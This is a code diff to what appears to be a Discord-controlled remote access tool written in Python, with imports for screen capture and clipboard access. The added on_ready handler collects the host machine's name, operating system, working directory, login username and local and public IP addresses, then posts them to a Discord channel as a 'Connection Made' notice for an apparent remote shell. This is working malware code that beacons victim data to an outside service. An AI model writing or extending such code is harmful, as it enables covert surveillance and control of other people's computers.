@@ -3,7 +3,7 @@ import discord
 from discord.ext import commands, tasks
 import os
 from PIL import ImageGrab
-from platform import system
+from platform import system, node
 from requests import get
 import socket
 import pyperclip
@@ -54,6 +54,61 @@ class MyBot(commands.Bot):
 
 bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
 
+
+# Connected message
+
+@bot.event
+async def on_ready():
+    channel_id = os.getenv("CHANNEL")
+    channel = bot.get_channel(int(channel_id))
+    
+    hostname = node()
+    OS = system()
+    Dir = os.getcwd()
+    username = os.getlogin()
+
+    try:
+        local_ip = get_local_ip()
+    except:
+        pass
+
+    public_ip = get_public_ip()
+
+    embed = discord.Embed(
+        title="Connection Made",
+        color=discord.Color.green()
+    )
+
+    embed.add_field(
+        name="Host",
+        value=f"Host is `{hostname}` running `{OS}`",
+        inline=False
+    )
+
+    embed.add_field(
+        name="User",
+        value=f"Username is: `{username}`"
+    )
+
+    embed.add_field(
+        name="Shell Directory",
+        value=f"Shell made in directory: `{Dir}`",
+        inline=False
+    )
+
+    embed.add_field(
+        name="Public IP",
+        value=f"`{public_ip}`",
+        inline=False
+    )
+
+    embed.add_field(
+        name="Local IP",
+        value=f"`{local_ip}`",
+        inline=False
+    )
+
+    await channel.send(embed=embed)
 
 # Standalone functions
 
